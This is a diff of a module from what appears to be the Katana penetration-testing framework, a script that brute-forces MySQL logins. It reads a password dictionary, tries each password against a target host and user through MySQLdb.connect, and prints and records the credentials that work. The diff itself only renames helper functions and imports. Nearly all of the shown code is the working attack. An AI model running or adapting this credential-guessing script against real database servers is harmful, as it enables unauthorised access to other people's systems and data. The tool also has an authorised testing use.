@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES
-from core.Function import isLive,saveRegister
 import MySQLdb
 # END LIBRARIES
 
@@ -18,7 +17,7 @@ def init():
 	init.Description        ="Brute Force to SQL protocol."
 	init.CodeName           ="btf/pr.sql"
 	init.DateCreation       ="16/05/2015"      
-	init.LastModification   ="24/05/2016"
+	init.LastModification   ="27/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -36,7 +35,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	isLive(init.var['target'],init.var['port'])
+	NET.CheckConnectionHost(init.var['target'],init.var['port'],5)
 	Loadingfile(init.var['dict'])
 
 	with open(init.var['dict'],'r') as passwords:
@@ -45,10 +44,9 @@ def main(run):
 			try:
 				MySQLdb.connect(init.var['target'],init.var['user'],password,'',int(init.var['port']))
 				if True:
-					printAlert(3,"Successfully with ["+init.var['user']+"]["+password+"]\n")
-					saveRegister(init,password)
+					printk.suff("Successfully with ["+init.var['user']+"]["+password+"]\n")
+					UTIL.sRegister(init,password)
 					return
-			except:printAlert(0," | Checking '"+password+"'")
-	printAlert(4," No Result :c\n")
+			except:printk.inf(" | Checking '"+password+"'")
 	
 # END CODE MODULE ############################################################################################
